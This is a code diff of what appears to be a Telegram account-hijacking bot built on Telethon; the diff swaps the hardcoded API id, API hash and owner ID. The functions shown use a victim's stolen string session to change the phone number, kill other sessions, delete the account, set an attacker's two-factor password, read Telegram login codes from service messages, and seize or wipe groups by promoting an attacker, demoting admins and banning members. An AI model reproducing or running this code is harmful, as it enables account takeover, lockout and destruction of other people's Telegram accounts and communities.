@@ -21,11 +21,11 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-legendx = 1967548493
+batu = 5273282306
 
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     bot = client = X
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
@@ -38,7 +38,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     bot = client = X
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
@@ -52,27 +52,27 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     k = await X.get_me()
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     await X(rt())
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     await X(functions.account.DeleteAccountRequest("me hi chutia hu"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
     except:
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     try:
       await X.edit_2fa('LEGENDXISBEST')
       return True
@@ -80,7 +80,7 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -90,28 +90,28 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     await X(join(username))
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     await X(dc(username))
     
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+    async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     i = ""
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
@@ -120,7 +120,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     k = await X.get_participants(grp)
     for x in k:
       try:
@@ -131,7 +131,7 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
+  async with tg(ses(strses), 17165647, "44aa62eb73c6869d4c6493b33342c146") as X:
     k = await X(pc())
     i = ""
     for x in k.chats:
